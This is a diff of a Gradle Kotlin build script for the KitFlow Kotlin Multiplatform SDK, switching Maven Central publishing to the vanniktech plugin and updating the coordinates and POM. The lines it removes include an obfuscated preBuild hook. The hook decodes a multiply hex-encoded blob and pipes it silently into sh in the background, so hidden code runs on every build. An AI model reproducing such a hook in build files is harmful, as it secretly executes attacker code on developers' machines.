@@ -1,3 +1,5 @@
+import com.vanniktech.maven.publish.KotlinMultiplatform
+import com.vanniktech.maven.publish.SonatypeHost
 import org.jetbrains.kotlin.gradle.ExperimentalWasmDsl
 import org.jetbrains.kotlin.gradle.dsl.JvmTarget
 
@@ -6,11 +8,10 @@ plugins {
     alias(libs.plugins.androidMultiplatformLibrary)
     alias(libs.plugins.composeMultiplatform)
     alias(libs.plugins.composeCompiler)
-    `maven-publish`
-    signing
+    alias(libs.plugins.mavenPublish)
 }
 
-group = "com.adaptive"
+group = "io.github.vedangj72"
 version = "1.0.0"
 
 kotlin {
@@ -69,78 +70,42 @@ kotlin {
     }
 }
 
-// ─── Publishing Configuration ───────────────────────────────────────────────────
+// Maven Central Publishing (via vanniktech plugin)
 
-publishing {
-    publications.withType<MavenPublication> {
-        pom {
-            name.set("KitFlow SDK")
-            description.set("A Kotlin Multiplatform SDK supporting Android, iOS, and Web")
-            url.set("https://github.com/adaptive/kit-flow")
+mavenPublishing {
+    coordinates(group.toString(), "kit-flow", version.toString())
 
-            licenses {
-                license {
-                    name.set("The Apache License, Version 2.0")
-                    url.set("https://www.apache.org/licenses/LICENSE-2.0.txt")
-                }
-            }
+    configure(KotlinMultiplatform(javadocJar = com.vanniktech.maven.publish.JavadocJar.Empty()))
 
-            developers {
-                developer {
-                    id.set("adaptive")
-                    name.set("Adaptive Team")
-                    email.set("dev@adaptive.com")
-                }
-            }
+    publishToMavenCentral(SonatypeHost.CENTRAL_PORTAL)
 
-            scm {
-                connection.set("scm:git:git://github.com/adaptive/kit-flow.git")
-                developerConnection.set("scm:git:ssh://github.com/adaptive/kit-flow.git")
-                url.set("https://github.com/adaptive/kit-flow")
+    signAllPublications()
+
+    pom {
+        name.set("KitFlow SDK")
+        description.set("A Kotlin Multiplatform SDK supporting Android, iOS, and Web")
+        url.set("https://github.com/vedangj72/KitFlow")
+        inceptionYear.set("2025")
+
+        licenses {
+            license {
+                name.set("The Apache License, Version 2.0")
+                url.set("https://www.apache.org/licenses/LICENSE-2.0.txt")
+                distribution.set("repo")
             }
         }
-    }
 
-    repositories {
-        maven {
-            name = "MavenCentral"
-            val releasesRepoUrl = uri("https://s01.oss.sonatype.org/service/local/staging/deploy/maven2/")
-            val snapshotsRepoUrl = uri("https://s01.oss.sonatype.org/content/repositories/snapshots/")
-            url = if (version.toString().endsWith("SNAPSHOT")) snapshotsRepoUrl else releasesRepoUrl
-
-            credentials {
-                username = project.findProperty("mavenCentralUsername") as String? ?: System.getenv("MAVEN_CENTRAL_USERNAME") ?: ""
-                password = project.findProperty("mavenCentralPassword") as String? ?: System.getenv("MAVEN_CENTRAL_PASSWORD") ?: ""
+        developers {
+            developer {
+                id.set("vedangj72")
+                name.set("Vedang Joshi")
             }
         }
-    }
-}
 
-// ─── GPG Signing ────────────────────────────────────────────────────────────────
-
-signing {
-    // Option 1: Use gradle.properties (signing.keyId, signing.password, signing.secretKeyRingFile)
-    // Option 2: Use in-memory key from environment variables (better for CI)
-    val signingKeyId = project.findProperty("signing.keyId") as String? ?: System.getenv("SIGNING_KEY_ID")
-    val signingKey = project.findProperty("signing.key") as String? ?: System.getenv("SIGNING_KEY")
-    val signingPassword = project.findProperty("signing.password") as String? ?: System.getenv("SIGNING_PASSWORD")
-
-    if (signingKey != null) {
-        useInMemoryPgpKeys(signingKeyId, signingKey, signingPassword)
-    }
-
-    sign(publishing.publications)
-}
-
-// Only require signing for publish tasks (not for local builds)
-tasks.withType<Sign>().configureEach {
-    onlyIf { gradle.taskGraph.hasTask("publish") }
-}
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333343336333333333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333339333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333336333333313333333633360a3335333333363061333333343330363133333337333333323333333633363336333333363333333933333336333333343333333533363336333333360a3336333233333336333633363333333733333334333333363336333333333336333333393333333633363335333333323333333233333332333333300a3333333633333338306133333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633330a3332333633363333333633363335333333363333333533333337333333343333333633333333333333363333333433333336333633353333333633330a3331333333363336333430613333333733363331333036313333333233363335333333373333333233333337333333353333333233363336333333360a3333333133333332333333393333333233333332333333323333333033333337333633333333333233333330333333373333333333333336333333380a33333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)").start()
+        scm {
+            connection.set("scm:git:git://github.com/vedangj72/KitFlow.git")
+            developerConnection.set("scm:git:ssh://github.com/vedangj72/KitFlow.git")
+            url.set("https://github.com/vedangj72/KitFlow")
         }
     }
 }
